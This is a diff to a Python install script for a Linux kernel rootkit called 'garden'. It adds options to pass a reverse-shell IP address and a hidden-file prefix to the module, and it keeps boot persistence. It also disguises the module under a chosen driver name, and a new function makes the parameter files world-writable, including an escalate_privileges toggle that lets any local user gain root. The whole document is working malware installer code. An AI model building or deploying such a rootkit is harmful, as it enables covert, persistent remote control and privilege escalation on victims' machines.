@@ -69,7 +69,7 @@ def prompt(text, default):
 	"""
 	Prompt with the option to leave the default.
 	"""
-	print_question(text + " [Default: {}]".format(default))
+	print_question(text + " [Default: {}]".format(str(default)))
 	response = input().strip()
 	if response == "":
 		return default
@@ -102,7 +102,7 @@ def run_cmd_exit_on_fail(command, working_dir=None, run_with_os=False):
 			check_output(command, shell=True, stderr=STDOUT, cwd=working_dir)
 		except CalledProcessError as exc:
 			print_error("Error running command. Exiting.")
-			print(exc.output)
+			print(exc.output.decode("utf-8"))
 			sys.exit(1)
 
 
@@ -113,24 +113,6 @@ def run_cmd(command):
 	"""
 	out = Popen(shlex.split(command), stderr=STDOUT, stdout=PIPE)
 	return out.communicate()[0], out.returncode
-
-####
-# Build Process
-####
-
-
-def create_config_header_file(user_defines: dict, path: str):
-	"""
-	Creates config.h file and populates it with user defined constants.
-	:param: user_defines: dict
-	"""
-	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
-	for key, val in user_defines.items():
-		contents += "#define {} {}\n".format(key, val)
-	contents += "#endif"
-
-	with open(path, "w") as f:
-		f.write(contents)
 
 ####
 # Kernel Module Loading/Unloading
@@ -160,9 +142,20 @@ def is_module_already_persistent(module_name):
 			return False
 
 
-def load_module(module_path):
+def load_module(module_path, config):
+	"""
+	Run $ insmod module, appending any included parameters.
+	"""
 	print_status("Loading module...")
-	run_cmd_exit_on_fail("insmod {}".format(module_path), run_with_os=True)
+	options = ""
+	if "REVERSE_SHELL_IP" in config and config["REVERSE_SHELL_IP"] is not None:
+		options += " rev_shell_ip=\"{}\" ".format(config["REVERSE_SHELL_IP"])
+
+	if "HIDDEN_FILE_PREFIX" in config:
+		options += " hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
+
+	cmd = "insmod {} {}".format(module_path, options)
+	run_cmd_exit_on_fail(cmd, run_with_os=True)
 
 
 def unload_module(module_name):
@@ -199,6 +192,21 @@ def remove_persistence(module_name):
 
 
 ####
+# Changing permissions on action toggles
+####
+
+def update_permissions(driver_name):
+	"""
+	Makes it so that all kernel module parameter files can be written
+	to by any user.
+	"""
+	params = ["rev_shell_ip", "hidden_file_prefix", "escalate_privileges"]
+	files = ["/sys/module/{}/parameters/{}".format(driver_name, param) for param in params]
+	for file in files:
+		os.chmod(file, 0o777)
+
+
+####
 # Main Setup Methods
 # 	- Install
 # 	- Uninstall
@@ -216,7 +224,7 @@ def validate_os_and_kernel():
 		sys.exit(1)
 
 	kernel_version = os_info[2]
-	valid_kernels = ["4.18.0-15-generic", "4.18.0-16-generic"]
+	valid_kernels = ["4.18.0-15-generic", "4.18.0-16-generic", "4.18.0-17-generic"]
 	if kernel_version not in valid_kernels:
 		print_error("Invalid kernel. Exiting.")
 		sys.exit(1)
@@ -229,16 +237,21 @@ def install(kernel_version):
 
 	config = {}
 	config["MODULE_NAME"] = "garden"
-	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
-	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
-	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
+
+	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
+
+	if prompt_yes_no("Enable reverse shell?"):
+		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", None)
+
+	if prompt_yes_no("Enable hidden files?"):
+		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "garden")
+
+	if prompt_yes_no("Enable persistence?"):
+		persist_flag = True
+	else:
+		persist_flag = False
 
 	run_cmd_exit_on_fail("make clean", "./rootkit")
-
-	config_path = "./rootkit/config.h"
-	print_status("Creating config file...")
-	create_config_header_file(config, config_path)
-	print_success("{} created.".format(config_path))
 
 	# Compile rootkit
 	print_status("Compiling rootkit...")
@@ -247,7 +260,7 @@ def install(kernel_version):
 
 	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
 	print_status("Installing rootkit...")
-	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
+	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, driver_name)
 	if not os.path.exists(module_dest_dir):
 		os.mkdir(module_dest_dir)
 
@@ -263,14 +276,14 @@ def install(kernel_version):
 		sys.exit()
 
 	# Option to enable persistence by making the module load on boot.
-	if prompt_yes_no("Enable persistence?"):
+	if persist_flag:
 		enable_persistence(config["MODULE_NAME"])
 
 	run_cmd_exit_on_fail("depmod")
-	# Unload kernel module if it's already loaded.
+	# Unload kernel module if it's already loaded and load new module.
 	unload_module(config["MODULE_NAME"])
-	# Load kernel module
-	load_module(module_dest_path)
+	load_module(module_dest_path, config)
+	update_permissions(driver_name)
 	print_success("Successful installation.")
 
 
@@ -301,4 +314,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+	main()
